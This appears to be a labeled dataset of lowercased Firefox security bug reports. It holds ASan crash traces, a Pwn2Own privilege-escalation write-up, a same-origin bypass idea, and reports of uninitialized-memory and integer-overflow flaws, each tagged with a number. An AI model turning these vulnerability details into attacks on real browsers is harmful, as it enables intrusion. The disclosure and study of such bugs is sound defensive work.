builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:2558 10 in runscript builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:448 11 in invoke builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:517 12 in invoke builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:554 13 in call builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jsapi.cpp:4474 14 in call builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/./eventhandlerbinding.cpp:259 15 in call nsisupports builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/events dist/include/mozilla/dom/eventhandlerbinding.h:350 16 in handleevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/jseventhandler.cpp:214 17 in handleeventsubtype builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventlistenermanager.cpp:976 18 in handleeventinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventlistenermanager.cpp:1124 19 in handleeventtargetchain builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:299 20 in dispatch builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:633 21 in dispatchdomevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:697 22 in dispatchevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/domeventtargethelper.cpp:251 23 in dispatchsuccessevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/actorschild.cpp:751 24 in recvpbackgroundidbversionchangetransactionconstructor builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/actorschild.cpp:1406 25 in onmessagereceived builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pbackgroundidbdatabasechild.cpp:560 26 in onmessagereceived builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pbackgroundchild.cpp:761 27 in dispatchasyncmessage builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1231 28 in onmaybedequeueone builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1142 29 in runtask builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:361 summary addresssanitizer heap-use-after-free 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region 2401==aborting p.s please let me know if something s wrong it s my first time with open source actual results it crashes expected results it should create index	11
privilege escalation from resource document e.g pdf viewer zdi-can-2826 from winning pwn2own entry by mariusz mlynski 2/2 2 privilege escalation this is an extension of the cross-origin bypass vulnerability the internal pdf viewer in firefox executes with the resource pdf.js/web/viewer.html security principal it s unprivileged but the handling of resource principals with respect to loading permissions is incorrect as documented in the source code caps/nsscriptsecuritymanager.cpp ns_imethodimp nsscriptsecuritymanager checkloaduriwithprincipal nsiprincipal aprincipal nsiuri atargeturi uint32_t aflags check for chrome target uri rv ns_urichainhasflags targetbaseuri nsiprotocolhandler uri_is_ui_resource hasflags ns_ensure_success rv rv if hasflags resource and chrome are equivalent securitywise that s bogus fix this but watch out for the view-source stylesheet bool sourceischrome rv ns_urichainhasflags sourcebaseuri nsiprotocolhandler uri_is_ui_resource sourceischrome ns_ensure_success rv rv if sourceischrome return ns_ok if reporterrors reporterror nullptr errortag sourceuri atargeturi return ns_error_dom_bad_uri the nsiprotocolhandler uri_is_ui_resource flag is set for chrome resource and moz-icon uris they re all free to load other uris with this flag including chrome-privileged pages under chrome this bogus treatment of resource principals paves the way for a privilege escalation in the event of a cross-origin bypass such as the one described above the attacker can use the session history confusion to execute code in the context of the pdf viewer and then re-use the said attack to compromise a privileged page allowing for javascript code execution with the system principal	2
a variant of bug 1144988 lets one bypass same-origin policy bz got this idea 1 start a new load 2 do an anchor scroll this does not cancel the load iirc 3 use the mutation event to wait until the load we started completes there are few options to fix this at least use the original patch for bug 1144988 add some more checks to doshortcircuitedload so that we just bail out early if anchor scrolling changes docshell s state to something unexpected	5
heap-buffer-overflow in svgtextframe resolvepositions tested on os ubuntu 14.04 firefox asan build from note repro-file will also crash stable firefox 36.0.4 on ubuntu 14.04 crash report-id bp-6e47afc4-a88c-4cf3-a591-0a0552150331 asan-trace 1594==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 1 at thread t0 web content 0 in svgtextframe resolvepositions nsicontent unsigned int bool bool nstarray gfxpoint builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:4403 1 in svgtextframe resolvepositions nsicontent unsigned int bool bool nstarray gfxpoint builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:4519 2 in svgtextframe resolvepositions nstarray gfxpoint bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:4564 3 in svgtextframe doglyphpositioning builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:5017 4 in updateglyphpositioning builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:5187 5 in svgtextframe reflowsvg builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:3819 6 in nssvgdisplaycontainerframe reflowsvg builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/nssvgcontainerframe.cpp:356 7 in nssvgoutersvgframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/nssvgoutersvgframe.cpp:437 is located 3 bytes to the right of 4096-byte region allocated by thread t0 web content here 0 in realloc builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:95 1 in moz_xrealloc builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/memory/mozalloc/mozalloc.cpp:121 2 in realloc builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/media/libstagefright dist/include/nstarray.h:185 3 in nstarray_base nstarrayinfallibleallocator nstarray_copywithmemutils ensurecapacity unsigned long unsigned long builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/media/libstagefright dist/include/nstarray-inl.h:182 4 in appendelement mozilla charposition builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/layout/svg dist/include/nstarray.h:1353 5 in svgtextframe resolvepositions nstarray gfxpoint bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:4555 6 in svgtextframe doglyphpositioning builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:5017 7 in updateglyphpositioning builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:5187 8 in svgtextframe reflowsvg builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/svgtextframe.cpp:3819	11
crash in cspservice shouldload unsigned int nsiuri nsiuri nsisupports nsacstring_internal const nsisupports nsiprincipal short from userscript user agent mozilla/5.0 windows nt 6.1 wow64 rv:35.0 gecko/20100101 firefox/35.0 build id 20150122214805 steps to reproduce test profile attached install profile on bookmark toolbar there is one saved bookmark firefox crash click bookmark actual results firefox will crash as page is loading if page finishes loading then click bookmark again crash usually happens by 3rd try expected results firefox should not crash previous versions of firefox do not crash	11
heap-use-after-free in setbreaks 3799==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 web content 0 in setbreaks builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:974 1 in flushcurrentword builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nslinebreaker.cpp:121 2 in reset builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nslinebreaker.cpp:489 3 in flushlinebreaks builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:1523 4 in flushframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:1513 5 in buildtextruns builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:1437 6 in reflowtext builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:8229 7 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:957 8 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 9 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 10 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 11 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 12 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 13 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 14 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 15 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 16 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 17 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 18 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 19 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 20 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3959 21 in doreflowinlineframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3761 22 in reflowinlineframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3627 23 in reflowline builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:2713 24 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:1160 25 in reflowblock builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockreflowcontext.cpp:291 26 in reflowblockframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3354 27 in reflowline builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:2710 28 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:1160 29 in reflowchild builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nscontainerframe.cpp:963 30 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nscanvasframe.cpp:672 31 in reflowchild builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nscontainerframe.cpp:963 32 in reflowcontents builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsgfxscrollframe.cpp:621 33 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsgfxscrollframe.cpp:856 34 in reflowchild builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nscontainerframe.cpp:1005 35 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsviewportframe.cpp:217 36 in doreflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nspresshell.cpp:9159 37 in processreflowcommands builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nspresshell.cpp:9319 38 in flushpendingnotifications builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nspresshell.cpp:4320 39 in tick builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nsrefreshdriver.cpp:1663 40 in tickdriver builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nsrefreshdriver.cpp:198 41 in runrefreshdrivers builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nsrefreshdriver.cpp:440 42 in recvnotify builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/ipc/vsyncchild.cpp:63 43 in onmessagereceived builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pvsyncchild.cpp:224 44 in onmessagereceived builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pbackgroundchild.cpp:1082 45 in dispatchasyncmessage builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1237 46 in dispatchmessage builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1164 47 in onmaybedequeueone builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1148 48 in runtask builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:361 49 in dowork builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:456 50 in run builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagepump.cpp:233 51 in processnextevent builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsthread.cpp:866 52 in ns_processnextevent builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/glue/nsthreadutils.cpp:265 53 in run builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagepump.cpp:140 54 in runinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:233 55 in run builds/slave/m-cen-l64-asan-000000000000000/build/src/widget/nsbaseappshell.cpp:164 56 in xre_runappshell builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsembedfunctions.cpp:738 57 in runinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:233 58 in xre_initchildprocess builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsembedfunctions.cpp:575 59 in content_process_main builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/app contentproc/plugin-container.cpp:222 60 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 61 in start is located 0 bytes inside of 26492-byte region freed by thread t0 web content here 0 in interceptor_free asan_rtl 1 in assigntextrun builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:2584 2 in buildtextrunforframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:2255 3 in flushframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:1508 4 in buildtextruns builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:1437 5 in reflowtext builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:8229 6 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:957 7 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 8 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 9 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 10 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 11 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 12 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 13 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 14 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 15 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 16 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 17 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 18 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 19 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3959 20 in doreflowinlineframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3761 21 in reflowinlineframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3627 22 in reflowline builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:2713 23 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:1160 24 in reflowblock builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockreflowcontext.cpp:291 25 in reflowblockframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3354 26 in reflowline builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:2710 27 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:1160 28 in reflowchild builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nscontainerframe.cpp:963 29 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nscanvasframe.cpp:672 previously allocated by thread t0 web content here 0 in interceptor_malloc asan_rtl 1 in allocatestoragefortextrun builds/slave/m-cen-l64-asan-000000000000000/build/src/gfx/thebes/gfxtextrun.cpp:109 2 in maketextrun unsigned char builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:581 3 in flushframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:1508 4 in buildtextruns builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:1437 5 in reflowtext builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nstextframe.cpp:8229 6 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:957 7 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 8 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 9 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 10 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 11 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 12 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 13 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 14 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 15 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:774 16 in reflowframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:658 17 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsinlineframe.cpp:434 18 in reflowframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nslinelayout.cpp:955 19 in reflowinlineframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3959 20 in doreflowinlineframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3761 21 in reflowinlineframes builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3627 22 in reflowline builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:2713 23 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:1160 24 in reflowblock builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockreflowcontext.cpp:291 25 in reflowblockframe builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:3354 26 in reflowline builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:2710 27 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nsblockframe.cpp:1160 28 in reflowchild builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nscontainerframe.cpp:963 29 in reflow builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/generic/nscanvasframe.cpp:672 summary addresssanitizer heap-use-after-free 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone 3799==aborting	11
cairotextureclientd3d9 borrowdrawtarget using uninitialized memory security received the following email of a bug submission subject security exploit submission date mon 18 may 2015 15:05:20 0700 from ron q1 lastland.net to security mozilla.org greetings i have found a bug that causes firefox to attempt to write to an address that is obtained from an area of the stack below the current stack pointer i.e uninitialized memory this area of the stack usually contains the address of executable code and thus writing to this address usually causes a crash since code is write-protected but the stack could depending upon the path taken into the defective code contain other addresses that could make this bug exploitable the bug is in cairotextureclientd3d9 borrowdrawtarget line 695 of the 38.0.1 version of gfx/layers/d3d9/textured3d9.cpp this function calls md3d9surface lockrect rect nullptr 0 which is the windows directx9 function lockrect if this call fails as it does sometimes when many tabs are open under windows xp sp3 32 bit lockrect leaves rect uninitialized however borrowdrawtarget does not check the return status instead using the uninitialized rect to create a new gfximagesurface other code later uses the new gfximagesurface typically this occurs via a call stack similar to the following from firefox 36.0.1 and a crash occurs while attempting to write to code at the address but other code paths are possible some of which probably permit an attacker to write arbitrary data into firefox s address space 1 xul.dll sse2_fill pixman_implementation_t imp unsigned int bits int stride int bpp int x int y int width int height unsigned int filler 2 xul.dll composite_boxes cairo_image_surface dst cairo_operator op const cairo_pattern pattern cairo_boxes_t boxes cairo_antialias antialias=cairo_antialias_none cairo_clip clip const cairo_composite_rectangles extents 3 xul.dll clip_and_composite_boxes cairo_image_surface dst cairo_operator op const cairo_pattern src cairo_boxes_t boxes cairo_antialias antialias=cairo_antialias_none cairo_composite_rectangles extents cairo_clip clip 4 xul.dll cairo_image_surface_fill void abstract_surface cairo_operator op=cairo_operator_clear const cairo_pattern source cairo_path_fixed path cairo_fill_rule fill_rule=cairo_fill_rule_winding double tolerance=0.10000000000000001 cairo_antialias antialias=cairo_antialias_none cairo_clip clip 5 xul.dll cairo_surface_fill cairo_surface surface cairo_operator op const cairo_pattern source cairo_path_fixed path cairo_fill_rule fill_rule=cairo_fill_rule_winding double tolerance=0.10000000000000001 cairo_antialias antialias=cairo_antialias_none cairo_clip clip 6 xul.dll moz_cairo_fill_preserve cairo cr 7 xul.dll mozilla gfx drawtargetcairo clearrect const mozilla gfx recttyped mozilla gfx unknownunits arect 8 xul.dll mozilla layers rotatedcontentbuffer borrowdrawtargetforpainting mozilla layers rotatedcontentbuffer paintstate apaintstate 9 xul.dll mozilla layers clientpaintedlayer paintthebes 10 xul.dll mozilla layers clientpaintedlayer renderlayerwithreadback mozilla layers readbackprocessor areadback 11 xul.dll mozilla layers clientcontainerlayer renderlayer 12 xul.dll mozilla layers clientlayer renderlayerwithreadback mozilla layers readbackprocessor areadback 13 xul.dll mozilla layers clientcontainerlayer renderlayer 14 xul.dll mozilla layers clientlayer renderlayerwithreadback mozilla layers readbackprocessor areadback 15 xul.dll mozilla layers clientcontainerlayer renderlayer 16 xul.dll mozilla layers clientlayermanager endtransactioninternal void mozilla layers paintedlayer gfxcontext const nsintregion mozilla layers drawregionclip const nsintregion void acallback void acallbackdata mozilla layers layermanager endtransactionflags formal 17 xul.dll mozilla layers clientlayermanager endtransaction void mozilla layers paintedlayer gfxcontext const nsintregion mozilla layers drawregionclip const nsintregion void acallback void acallbackdata mozilla layers layermanager endtransactionflags aflags=end_default 18 xul.dll nsdisplaylist paintroot nsdisplaylistbuilder abuilder nsrenderingcontext actx unsigned int aflags 19 xul.dll nslayoututils paintframe nsrenderingcontext arenderingcontext nsiframe aframe const nsregion adirtyregion unsigned int abackstop unsigned int aflags 20 xul.dll presshell paint nsview aviewtopaint const nsregion adirtyregion unsigned int aflags 21 xul.dll nsviewmanager processpendingupdatespaint nsiwidget awidget 22 xul.dll nsviewmanager processpendingupdatesforview nsview aview bool aflushdirtyregion=true 23 xul.dll nsviewmanager processpendingupdates 24 xul.dll nsrefreshdriver tick int64 anowepoch=0x mozilla timestamp anowtime 25 xul.dll mozilla refreshdrivertimer tick 26 xul.dll nstimerimpl fire 27 xul.dll nstimerevent run 28 xul.dll nsthread processnextevent bool amaywait=false bool aresult 29 xul.dll mozilla ipc messagepump run base messagepump delegate adelegate 30 xul.dll messageloop runhandler 31 xul.dll messageloop run 32 xul.dll nsbaseappshell run 33 xul.dll nsappshell run 34 xul.dll nsappstartup run 35 xul.dll xremain xre_mainrun 36 xul.dll xremain xre_main int argc char argv const nsxreappdata aappdata 37 xul.dll xre_main int argc char argv const nsxreappdata aappdata unsigned int aflags 38 firefox.exe do_main int argc char argv nsifile xredirectory 39 firefox.exe ns_internal_main int argc char argv 40 firefox.exe wmain int argc wchar_t argv 41 firefox.exe tmaincrtstartup i have reproduced this crash in firefox 36.0.1 under windows xp sp3 32-bit reproduction typically requires creating 200 tabs initialized with assorted urls not all of which need to be loaded then just switching between windows/tabs until firefox crashes the crash is more likely after sleeping or hibernating the computer for 30 min the crash also occurs more frequently under firefox 36.0 i have not yet reproduced this crash under the latest firefox 38.0.1 but i have verified that the buggy code in cairotextureclientd3d9 borrowdrawtarget exists and is executed in that version and that manually modifying the returned rect causes a crash just like the one in 36.0.1 perhaps some other change has been made that makes it less likely that the lockrect call in borrowdrawtarget will fail crashes resulting from this bug might have been reported at it s hard to tell but no one else appears to have diagnosed the bug so it seems that it is eligible for the bug bounty sincerely ronald crane independent security researcher	11
memory safety bug due to bad test in nsziparchive.cpp user agent mozilla/5.0 windows rv:26.0 gecko/20100101 firefox/26.0 build id 20150305021524 steps to reproduce firefox 38.0.1 nsziparchive getdataoffset does not validate the archive s local header correctly it uses the code 790 uint32_t len mfd mlen 791 const uint8_t data mfd mfiledata 792 uint32_t offset aitem localoffset 793 if offset ziplocal_size len 794 return 0 795 796 check signature before using the structure in case the zip file is corrupt 797 ziplocal local ziplocal data offset 798 if xtolong local signature localsig 799 return 0 the problem is with the line 793 if offset which comes directly from the archive field central localhdr_offset is the quantity offset ziplocal_size will overflow a uint32_t resulting in a value len line 797 will then compute data+offset which will point somewhere arbitrary in memory in almost every case line 798 will then either cause a read-access violation or a failed comparison to localsig which presumably means that nothing will use the corrupt item it is however faintly possible that data+offset points to valid memory that contains localsig which would lead to unpredictable behavior somewhere down the road hence i have marked this as a security bug this bug seems likely to be the cause of it might also be involved in	11
rx d3d11 setbufferdata using uninitialized memory user agent mozilla/5.0 windows rv:26.0 gecko/20100101 firefox/26.0 build id 20150305021524 steps to reproduce in firefox 38.0.1 rx d3d11 setbufferdata uses uninitialized memory at gfx\angle\src\libglesv2\renderer\d3d\d3d11\renderer11_utils.h line 176 the problem is that setbufferdata does not check the return value from the windows function id3d11devicecontext map at line 174 thus on failure leaving untouched whatever was contained in the uninitialized variable mappedresource 173 d3d11_mapped_subresource mappedresource 174 context map constantbuffer 0 d3d11_map_write_discard 0 mappedresource 175 176 memcpy mappedresource.pdata value sizeof t since mappedresource can contain anything this bug could make it possible to write data into anywhere in firefox s address space depending on how setbufferdata is used this bug might be exploitable to disclose sensitive data and/or cause execution of attacker-selected code	11
